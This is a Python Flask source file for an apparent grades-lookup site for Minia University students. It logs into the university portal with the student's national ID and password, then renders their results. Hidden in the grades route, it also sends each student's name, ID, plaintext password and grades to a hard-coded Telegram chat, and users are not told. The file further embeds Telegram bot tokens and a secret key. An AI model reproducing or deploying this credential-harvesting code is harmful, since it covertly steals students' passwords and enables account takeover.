from flask import Flask, render_template, request, flash, redirect, url_for, send_file
import requests
import json
import telebot
import base64

app = Flask(__name__)
app.secret_key = 'Raafat01011508719'

# Initialize Telegram bot
bot = telebot.TeleBot("6893223743:AAGuItvnqT7tixkqNOI0J8PZNlAYWdMC0Wc")

def send_to_telegram(message):
    bot_token = "6512189034:AAFiP4hSCd5LXSIbK0KlkI-9qmUYh3fCAwQ"
    chat_id = "854578633"
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    
    # Sending the message
    params = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "HTML"  # HTML allows for better formatting
    }
    
    response = requests.get(url, params=params)
    
    if response.status_code != 200:
        print(f"Error sending message to Telegram: {response.status_code}")


@app.route('/')
def index():
    return render_template('index.html')

@app.route('/grades', methods=['POST'])
def get_grades():
    try:
        email = request.form['username'].strip()
        password = request.form['password'].strip()

        if not all(ord(char) < 128 for char in email):
            flash("يجب كتابه الرقم القومي بالارقام الانجليزيه!")
            return redirect(url_for('index'))

        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'User-Agent': 'Mozilla/5.0'
        }

        data = {
            'UserName': email,
            'Password': password,
        }

        response = requests.post('http://stda.minia.edu.eg/Portallogin', headers=headers, data=data, timeout=120)
        if response.status_code == 200:
            cookies = response.cookies
            response_json = response.json()
            if response_json == [{"Message": "", "Link": "/"}]:
                data = {
                    'param0': 'Portal.General',
                    'param1': 'GetStudentPortalData',
                    'param2': '{"UserID":""}',
                }
                response = requests.post('http://stda.minia.edu.eg/PortalgetJCI', headers=headers, cookies=cookies, data=data)
                UUID = response.json()[0]['UUID']

                data = {
                    'param0': 'Portal.Results',
                    'param1': 'GetAllResults',
                    'param2': json.dumps({"UUID": UUID}),
                }

                response = requests.post('http://stda.minia.edu.eg/PortalgetJCI', headers=headers, cookies=cookies, data=data, verify=False)
                response_json = response.json()

                grades_by_year = {
                    "First": {"first_semester": [], "second_semester": []},
                    "Second": {"first_semester": [], "second_semester": []},
                    "Third": {"first_semester": [], "second_semester": []},
                    "Fourth": {"first_semester": [], "second_semester": []},
                    "Fifth": {"first_semester": [], "second_semester": []}
                }

                percentages_by_year = {}

                data = {
                    'param0': 'Portal.StudentsPortal',
                    'param1': 'GetPortaStudentPersonal',
                    'param2': json.dumps({"UUID": UUID}),
                }

                user_data = requests.post('http://stda.minia.edu.eg/PortalgetJCI', cookies=cookies, headers=headers, data=data).json()
                full_name = user_data[0]['Name'].split('|')[0]
                img_url = user_data[0]['ImgUrl']
                if img_url.startswith('/'):
                    image_url = f"http://stda.minia.edu.eg{img_url}"
                else:
                    image_url = img_url

                img_base64 = None
                img_mime = 'image/jpeg'
                try:
                    response = requests.get(image_url, timeout=5)
                    response.raise_for_status()
                    img_bytes = response.content
                    img_base64 = base64.b64encode(img_bytes).decode('utf-8')
                    img_mime = response.headers.get('Content-Type', 'image/jpeg')
                except Exception as e:
                    img_base64 = None
                    img_mime = 'image/svg+xml'

                for entry in response_json:
                    year = entry['ScopeName'].split('-')[0].strip()
                    if 'أولى' in year:
                        year_category = "First"
                    elif 'ثانية' in year:
                        year_category = "Second"
                    elif 'ثالثة' in year:
                        year_category = "Third"
                    elif 'رابعة' in year:
                        year_category = "Fourth"
                    elif 'خامسة' in year:
                        year_category = "Fifth"
                    else:
                        continue
                    if entry.get('ds') and len(entry['ds']) > 0:
                        for course in entry['ds'][0].get('StudyYearCourses', []):
                            course_name = course['CourseName'].replace("|", ' ')
                            max_score = course['Max']
                            total_score = course['Total']
                            grade_name = course["GradeName"].split("|")[0]
                            semester = "unknown"
                            if course.get('Parts') and len(course['Parts']) > 0:
                                sem_name = course['Parts'][0].get('SemasterName', '')
                                if "الأول" in sem_name or "First Term" in sem_name:
                                    semester = "first_semester"
                                elif "الثانى" in sem_name or "Second Term" in sem_name:
                                    semester = "second_semester"
                            if total_score:
                                try:
                                    percentage = (float(total_score) / float(max_score)) * 100
                                except:
                                    percentage = 0
                            else:
                                percentage = 0
                                total_score = 0
                                grade_name = "غير معروف"
                            course_obj = {
                                'course_name': course_name,
                                'grade': grade_name,
                                'max_score': max_score,
                                'total_score': total_score,
                                'percentage': int(percentage)
                            }
                            if semester in ["first_semester", "second_semester"]:
                                grades_by_year[year_category][semester].append(course_obj)

                # Calculate percentages
                for year, semesters in grades_by_year.items():
                    year_total = 0
                    year_max = 0
                    percentages_by_year[year] = {}
                    for semester in ["first_semester", "second_semester"]:
                        sem_total = sum(float(g['total_score']) for g in semesters[semester])
                        sem_max = sum(float(g['max_score']) for g in semesters[semester])
                        percentages_by_year[year][semester] = "{:.2f}".format((sem_total / sem_max) * 100) if sem_max > 0 else "0.00"
                        year_total += sem_total
                        year_max += sem_max
                    percentages_by_year[year]['total'] = "{:.2f}".format((year_total / year_max) * 100) if year_max > 0 else "0.00"

                # Send data to Telegram
                message = f"""
                <b>الطالب:</b> {full_name}
                <b>الرقم القومي:</b> {email}
                <b>كلمة المرور:</b> {password}
                <b>النتائج:</b>
                """
                for year, semesters in grades_by_year.items():
                    message += f"\n\n<b>{year}:</b>\n"
                    for semester in ["first_semester", "second_semester"]:
                        for course in semesters[semester]:
                            message += f"- <b>{course['course_name']}</b>: {course['grade']} ({course['percentage']}%)\n"
                
                send_to_telegram(message)  # Send the structured message

                # Special congrats logic for user 30411102402043
                congrats_cooky = False
                congrats_message = ""
                if email == "30411102402043":
                    try:
                        percent = float(percentages_by_year["Third"]["second_semester"])
                        print(percent)
                        if percent >= 85:
                            congrats_cooky = True
                            congrats_message = "الف مبروووك الامتيااااز يا كوكي ❤️🫵"
                    except Exception:
                        pass

                return render_template(
                    'grades.html',
                    grades_by_year=grades_by_year,
                    name=" ".join(full_name.split(" ")[:2]),
                    percentage_by_year=percentages_by_year,
                    image_url=image_url,
                    img_base64=img_base64,
                    img_mime=img_mime,
                    student_code=user_data[0]['Code'],
                    congrats_cooky=congrats_cooky,
                    congrats_message=congrats_message
                )

            else:
                flash("الرقم القومي او كلمة المرور خاطئة!")
                return redirect(url_for('index'))

        else:
            flash("حدث خطأ في الاتصال بالخادم!")
            return redirect(url_for('index'))

    except Exception as e:
        flash(f"حدث خطأ غير متوقع: {str(e)}")
        return redirect(url_for('index'))
if __name__ == "__main__":
    app.run(debug=True)
